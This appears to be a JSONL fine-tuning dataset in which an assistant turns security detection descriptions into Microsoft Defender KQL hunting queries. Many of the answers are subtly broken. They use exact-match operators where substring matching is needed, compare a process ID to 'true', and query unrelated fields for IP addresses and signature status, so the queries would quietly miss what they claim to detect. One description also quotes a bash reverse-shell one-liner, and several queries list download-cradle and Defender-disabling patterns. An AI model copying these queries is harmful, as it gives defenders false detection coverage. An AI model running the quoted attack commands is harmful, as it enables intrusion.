{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n Topic: proc_creation_win_auditpol_nt_resource_kit_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"/logon:none\", \"/system:none\", \"/sam:none\", \"/privilege:none\", \"/object:none\", \"/process:none\", \"/policy:none\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder Topic: proc_creation_win_powershell_susp_ps_appdata"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"powershell.exe\", \"\\\\powershell\", \"\\\\pwsh\", \"pwsh.exe\")) and (ProcessCommandLine in~ (\"/c \", \"\\\\AppData\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with the \"REGSVR\" action where the DLL in question doesnt contain a \".dll\" extension. Which is often used as a method to evade defenses. Topic: proc_creation_win_odbcconf_register_dll_regsvr_susp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"REGSVR \" and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")) and (not(ProcessCommandLine =~ \".dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against Topic: proc_creation_win_hktl_hashcat"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-a \", \"-m 1000 \", \"-r \")) or InitiatingProcessFolderPath =~ \"\\\\hashcat.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when the file \"passwd\" or \"shadow\" is copied from tmp path Topic: proc_creation_lnx_cp_passwd_or_shadow_tmp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"passwd\", \"shadow\")) and InitiatingProcessFolderPath =~ \"/cp\" and ProcessCommandLine =~ \"/tmp/\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects activity that could be related to Baby Shark malware Topic: proc_creation_win_malware_babyshark"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"powershell.exe mshta.exe http\" and ProcessCommandLine contains \".hta\") or (ProcessCommandLine contains \"reg query \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Default\\\"\" or ProcessCommandLine contains \"cmd.exe /c taskkill /im cmd.exe\" or ProcessCommandLine contains \"(New-Object System.Net.WebClient).UploadFile('http\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with the name \"code_tunnel.json\" which indicate execution and usage of VsCode tunneling utility by an \"Image\" or \"Process\" other than VsCode.\n Topic: file_event_win_vscode_tunnel_renamed_execution"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\code_tunnel.json\" and (not((InitiatingProcessFolderPath in~ (\"\\\\code-tunnel.exe\", \"\\\\code.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the NGenAssemblyUsageLog registry key.\n.NET Usage Log output location can be controlled by setting the NGenAssemblyUsageLog CLR configuration knob in the Registry or by configuring an environment variable (as described in the next section).\nBy simplify specifying an arbitrary value (e.g. fake output location or junk data) for the expected value, a Usage Log file for the .NET execution context will not be created.\n Topic: registry_set_net_cli_ngenassemblyusagelog"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\NGenAssemblyUsageLog\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"DbgModel.dll\" Topic: image_load_side_load_dbgmodel"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\dbgmodel.dll\" and (not((FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\"))) and (not((FolderPath startswith \"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.WinDbg_\" or (FolderPath startswith \"C:\\\\Program Files (x86)\\\\Windows Kits\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\Windows Kits\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects change the the \"AutodialDLL\" key which could be used as a persistence method to load custom DLL via the \"ws2_32\" library Topic: registry_set_persistence_autodial_dll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Services\\\\WinSock2\\\\Parameters\\\\AutodialDLL\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential process and execution activity related to APT10 Cloud Hopper operation Topic: proc_creation_win_apt_apt10_cloud_hopper"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \".vbs /shell \" and InitiatingProcessFolderPath =~ \"\\\\cscript.exe\") or (ProcessCommandLine in~ (\"csvde -f C:\\\\windows\\\\web\\\\\", \".log\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a bash contecting to a remote IP address (often found when actors do something like bash -i >& /dev/tcp/10.0.0.1/4242 0>&1) Topic: net_connection_lnx_back_connect_shell_dev"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"/bin/bash\" and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.1\", \"0.0.0.0\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential beaconing activity to domains related to 3CX 3CXDesktopApp compromise Topic: net_connection_win_malware_3cx_compromise_beaconing_activity"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"\\\\3CXDesktopApp.exe\" and (RemoteUrl in~ (\"akamaicontainer.com\", \"akamaitechcloudservices.com\", \"azuredeploystore.com\", \"azureonlinecloud.com\", \"azureonlinestorage.com\", \"dunamistrd.com\", \"glcloudservice.com\", \"journalide.org\", \"msedgepackageinfo.com\", \"msstorageazure.com\", \"msstorageboxes.com\", \"officeaddons.com\", \"officestoragebox.com\", \"pbxcloudeservices.com\", \"pbxphonenetwork.com\", \"pbxsources.com\", \"qwepoi123098.com\", \"sbmsa.wiki\", \"sourceslabs.com\", \"visualstudiofactory.com\", \"zacharryblogs.com\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of the default output filename used by the wmiexec tool Topic: file_event_win_wmiexec_default_filename"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FolderPath matches regex \"\\\\\\\\Windows\\\\\\\\__1\\\\d{9}\\\\.\\\\d{1,7}$\" or FolderPath matches regex \"C:\\\\\\\\__1\\\\d{9}\\\\.\\\\d{1,7}$\" or FolderPath matches regex \"D:\\\\\\\\__1\\\\d{9}\\\\.\\\\d{1,7}$\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of backups or system state backups via \"wbadmin.exe\".\nThis technique is used by numerous ransomware families and actors.\nThis may only be successful on server platforms that have Windows Backup enabled.\n Topic: proc_creation_win_wbadmin_delete_backups"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"delete \", \"backup\")) and (FolderPath endswith \"\\\\wbadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"WBADMIN.EXE\")) and (not(ProcessCommandLine =~ \"keepVersions:0\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to \"DsrmAdminLogonBehavior\" registry value.\nDuring a Domain Controller (DC) promotion, administrators create a Directory Services Restore Mode (DSRM) local administrator account with a password that rarely changes. The DSRM account is an \u201cAdministrator\u201d account that logs in with the DSRM mode when the server is booting up to restore AD backups or recover the server from a failure.\nAttackers could abuse DSRM account to maintain their persistence and access to the organizations Active Directory.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"0\", the administrator account can only be used if the DC starts in DSRM.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"1\", the administrator account can only be used if the local AD DS service is stopped.\nIf the \"DsrmAdminLogonBehavior\" value is set to \"2\", the administrator account can always be used.\n Topic: registry_set_dsrm_tampering"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" and (not(RegistryValueData =~ \"DWORD (0x00000000)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect set Notification_Suppress to 1 to disable the Windows security center notification Topic: registry_set_suppress_defender_notifications"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\UX Configuration\\\\Notification_Suppress\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands Topic: proc_creation_win_schtasks_susp_pattern"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"/Create \" and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (((ProcessCommandLine in~ (\"/sc minute \", \"/ru system \")) and (ProcessCommandLine in~ (\"cmd /c\", \"cmd /k\", \"cmd /r\", \"cmd.exe /c \", \"cmd.exe /k \", \"cmd.exe /r \"))) or (ProcessCommandLine in~ (\" -decode \", \" -enc \", \" -w hidden \", \" bypass \", \" IEX\", \".DownloadData\", \".DownloadFile\", \".DownloadString\", \"/c start /min \", \"FromBase64String\", \"mshta http\", \"mshta.exe http\")) or ((ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Temp\\\\\", \":\\\\Tmp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Temp\\\\\", \"\\\\AppData\\\\\", \"%AppData%\", \"%Temp%\", \"%tmp%\")) and (ProcessCommandLine in~ (\"cscript\", \"curl\", \"wscript\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects requests to disable Microsoft Defender features using PowerShell commands Topic: proc_creation_win_powershell_defender_disable_feature"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"Add-MpPreference \", \"Set-MpPreference \")) and (ProcessCommandLine in~ (\"DisableArchiveScanning \", \"DisableRealtimeMonitoring \", \"DisableIOAVProtection \", \"DisableBehaviorMonitoring \", \"DisableBlockAtFirstSeen \", \"DisableCatchupFullScan \", \"DisableCatchupQuickScan \")) and (ProcessCommandLine in~ (\"$true\", \" 1 \"))) or ((ProcessCommandLine in~ (\"RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\", \"QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\", \"EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA\", \"RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA\", \"QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA\", \"EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA\", \"RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA\", \"QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA\", \"EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA\", \"RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA\", \"QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA\", \"EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA\", \"ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\", \"QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\", \"kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA\", \"ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA\", \"QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA\", \"kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA\", \"ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA\", \"QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA\", \"kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA\", \"ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA\", \"QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA\", \"kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA\", \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAEYAdQBsAGwAUwBjAGEAbgA\", \"RABpAHMAYQBiAGwAZQBDAGEAdABjAGgAdQBwAFEAdQBpAGMAawBTAGMAYQBuAA\", \"RABpAHMAYQBiAGwAZQBBAHIAYwBoAGkAdgBlAFMAYwBhAG4AbgBpAG4AZwA\")) or (ProcessCommandLine contains \"ZGlzYWJsZWFyY2hpdmVzY2FubmluZy\" or ProcessCommandLine contains \"Rpc2FibGVhcmNoaXZlc2Nhbm5pbmcg\" or ProcessCommandLine contains \"kaXNhYmxlYXJjaGl2ZXNjYW5uaW5nI\" or ProcessCommandLine contains \"RGlzYWJsZUFyY2hpdmVTY2FubmluZy\" or ProcessCommandLine contains \"Rpc2FibGVBcmNoaXZlU2Nhbm5pbmcg\" or ProcessCommandLine contains \"EaXNhYmxlQXJjaGl2ZVNjYW5uaW5nI\" or ProcessCommandLine contains \"ZGlzYWJsZWJlaGF2aW9ybW9uaXRvcmluZy\" or ProcessCommandLine contains \"Rpc2FibGViZWhhdmlvcm1vbml0b3Jpbmcg\" or ProcessCommandLine contains \"kaXNhYmxlYmVoYXZpb3Jtb25pdG9yaW5nI\" or ProcessCommandLine contains \"RGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZy\" or ProcessCommandLine contains \"Rpc2FibGVCZWhhdmlvck1vbml0b3Jpbmcg\" or ProcessCommandLine contains \"EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nI\" or ProcessCommandLine contains \"ZGlzYWJsZWJsb2NrYXRmaXJzdHNlZW4g\" or ProcessCommandLine contains \"Rpc2FibGVibG9ja2F0Zmlyc3RzZWVuI\" or ProcessCommandLine contains \"kaXNhYmxlYmxvY2thdGZpcnN0c2Vlbi\" or ProcessCommandLine contains \"RGlzYWJsZUJsb2NrQXRGaXJzdFNlZW4g\" or ProcessCommandLine contains \"Rpc2FibGVCbG9ja0F0Rmlyc3RTZWVuI\" or ProcessCommandLine contains \"EaXNhYmxlQmxvY2tBdEZpcnN0U2Vlbi\" or ProcessCommandLine contains \"ZGlzYWJsZWNhdGNodXBmdWxsc2Nhbi\" or ProcessCommandLine contains \"Rpc2FibGVjYXRjaHVwZnVsbHNjYW4g\" or ProcessCommandLine contains \"kaXNhYmxlY2F0Y2h1cGZ1bGxzY2FuI\" or ProcessCommandLine contains \"RGlzYWJsZUNhdGNodXBGdWxsU2Nhbi\" or ProcessCommandLine contains \"Rpc2FibGVDYXRjaHVwRnVsbFNjYW4g\" or ProcessCommandLine contains \"EaXNhYmxlQ2F0Y2h1cEZ1bGxTY2FuI\" or ProcessCommandLine contains \"ZGlzYWJsZWNhdGNodXBxdWlja3NjYW4g\" or ProcessCommandLine contains \"Rpc2FibGVjYXRjaHVwcXVpY2tzY2FuI\" or ProcessCommandLine contains \"kaXNhYmxlY2F0Y2h1cHF1aWNrc2Nhbi\" or ProcessCommandLine contains \"RGlzYWJsZUNhdGNodXBRdWlja1NjYW4g\" or ProcessCommandLine contains \"Rpc2FibGVDYXRjaHVwUXVpY2tTY2FuI\" or ProcessCommandLine contains \"EaXNhYmxlQ2F0Y2h1cFF1aWNrU2Nhbi\" or ProcessCommandLine contains \"ZGlzYWJsZWlvYXZwcm90ZWN0aW9uI\" or ProcessCommandLine contains \"Rpc2FibGVpb2F2cHJvdGVjdGlvbi\" or ProcessCommandLine contains \"kaXNhYmxlaW9hdnByb3RlY3Rpb24g\" or ProcessCommandLine contains \"RGlzYWJsZUlPQVZQcm90ZWN0aW9uI\" or ProcessCommandLine contains \"Rpc2FibGVJT0FWUHJvdGVjdGlvbi\" or ProcessCommandLine contains \"EaXNhYmxlSU9BVlByb3RlY3Rpb24g\" or ProcessCommandLine contains \"ZGlzYWJsZXJlYWx0aW1lbW9uaXRvcmluZy\" or ProcessCommandLine contains \"Rpc2FibGVyZWFsdGltZW1vbml0b3Jpbmcg\" or ProcessCommandLine contains \"kaXNhYmxlcmVhbHRpbWVtb25pdG9yaW5nI\" or ProcessCommandLine contains \"RGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZy\" or ProcessCommandLine contains \"Rpc2FibGVSZWFsdGltZU1vbml0b3Jpbmcg\" or ProcessCommandLine contains \"EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nI\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file deletion using \"rm\", \"shred\" or \"unlink\" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity Topic: proc_creation_lnx_file_deletion"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/rm\", \"/shred\", \"/unlink\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to create and add an account to the admin group via \"sysadminctl\" Topic: proc_creation_macos_sysadminctl_add_user_to_admin_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -addUser \", \" -admin \")) and InitiatingProcessFolderPath =~ \"/sysadminctl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of an Office application that points to a document that is located in a trusted location. Attackers often used this to avoid macro security and execute their malicious code. Topic: proc_creation_win_office_exec_from_trusted_locations"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\EXCEL.EXE\" or FolderPath endswith \"\\\\POWERPNT.EXE\" or FolderPath endswith \"\\\\WINWORD.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Excel.exe\", \"POWERPNT.EXE\", \"WinWord.exe\"))) and (InitiatingProcessFileName in~ (\"\\\\explorer.exe\", \"\\\\dopus.exe\")) and (ProcessCommandLine in~ (\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Templates\", \"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Word\\\\Startup\\\\\", \"\\\\Microsoft Office\\\\root\\\\Templates\\\\\", \"\\\\Microsoft Office\\\\Templates\\\\\"))) and (not((ProcessCommandLine endswith \".dotx\" or ProcessCommandLine endswith \".xltx\" or ProcessCommandLine endswith \".potx\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file download using curl.exe Topic: proc_creation_win_curl_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoProductName =~ \"The curl executable\") and (ProcessCommandLine in~ (\" -O\", \"--remote-name\", \"--output\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects windows utilities loading an unsigned or untrusted DLL.\nAdversaries often abuse those programs to proxy execution of malicious code.\n Topic: image_load_susp_unsigned_dll"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (InitiatingProcessFolderPath in~ (\"\\\\InstallUtil.exe\", \"\\\\RegAsm.exe\", \"\\\\RegSvcs.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\")) and (not(((InitiatingProcessVersionInfoCompanyName in~ (\"errorChaining\", \"errorCode_endpoint\", \"errorExpired\", \"trusted\")) or (InitiatingProcessVersionInfoCompanyName in~ (\"\", \"-\")) or isnull(InitiatingProcessVersionInfoCompanyName) or InitiatingProcessVersionInfoCompanyName =~ \"true\" or (InitiatingProcessVersionInfoCompanyName in~ (\"\", \"-\")) or isnull(InitiatingProcessVersionInfoCompanyName))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections to Visual Studio Code tunnel domains initiated by a process on a system. Attackers can abuse that feature to establish a reverse shell or persistence on a machine.\n Topic: net_connection_win_domain_vscode_tunnel_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and RemoteUrl =~ \".tunnels.api.visualstudio.com\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL hijack of \"iertutil.dll\" found in the DCOM InternetExplorer.Application Class Topic: image_load_iexplore_dcom_iertutil_dll_hijack"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\Internet Explorer\\\\iertutil.dll\" and InitiatingProcessFolderPath =~ \"\\\\Internet Explorer\\\\iexplore.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed \"Msdt.exe\" binary Topic: proc_creation_win_renamed_msdt"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"msdt.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\msdt.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential Muddywater APT activity Topic: proc_creation_win_apt_muddywater_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"vbscript:Close(Execute(\\\"CreateObject(\", \"powershell\", \"-w 1 -exec Bypass\", \"\\\\ProgramData\\\\\")) or (ProcessCommandLine in~ (\"[Convert]::ToBase64String\", \"[System.Text.Encoding]::UTF8.GetString]\", \"GetResponse().GetResponseStream()\", \"[System.Net.HttpWebRequest]::Create(\", \"-bxor \")) or (ProcessCommandLine in~ (\"Win32_OperatingSystem\", \"Win32_NetworkAdapterConfiguration\", \"root\\\\SecurityCenter2\", \"[System.Net.DNS]\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of a new file or path exclusion to MacOS Time Machine via the \"tmutil\" utility.\nAn adversary could exclude a path from Time Machine backups to prevent certain files from being backed up.\n Topic: proc_creation_macos_tmutil_exclude_file_from_backup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"addexclusion\" and (FolderPath endswith \"/tmutil\" or ProcessCommandLine contains \"tmutil\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework Topic: proc_creation_win_hktl_impacket_lateral_movement"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessCommandLine in~ (\"svchost.exe -k netsvcs\", \"taskeng.exe\")) and (ProcessCommandLine in~ (\"cmd.exe\", \"/C\", \"Windows\\\\Temp\\\\\", \"&1\"))) or ((InitiatingProcessFileName in~ (\"\\\\wmiprvse.exe\", \"\\\\mmc.exe\", \"\\\\explorer.exe\", \"\\\\services.exe\")) and (ProcessCommandLine in~ (\"cmd.exe\", \"/Q\", \"/c\", \"\\\\\\\\127.0.0.1\\\\\", \"&1\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a \"regsvr32\" execution where the DLL doesnt contain a common file extension. Topic: proc_creation_win_regsvr32_uncommon_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGSVR32.EXE\") and (not((ProcessCommandLine =~ \"\" or (ProcessCommandLine in~ (\".ax\", \".cpl\", \".dll\", \".ocx\")) or isnull(ProcessCommandLine)))) and (not((ProcessCommandLine in~ (\".bav\", \".ppl\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of \"Ilasm.EXE\" in order to compile C# intermediate (IL) code to EXE or DLL. Topic: proc_creation_win_ilasm_il_code_compilation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /dll\", \" /exe\")) and (FolderPath endswith \"\\\\ilasm.exe\" or ProcessVersionInfoOriginalFileName =~ \"ilasm.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious child processes of \"aspnet_compiler.exe\". Topic: proc_creation_win_aspnet_compiler_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\calc.exe\" or FolderPath endswith \"\\\\notepad.exe\") or (FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Roaming\\\\\" or FolderPath contains \":\\\\Temp\\\\\" or FolderPath contains \":\\\\Windows\\\\Temp\\\\\" or FolderPath contains \":\\\\Windows\\\\System32\\\\Tasks\\\\\" or FolderPath contains \":\\\\Windows\\\\Tasks\\\\\")) and InitiatingProcessFileName =~ \"\\\\aspnet_compiler.exe\""}]}
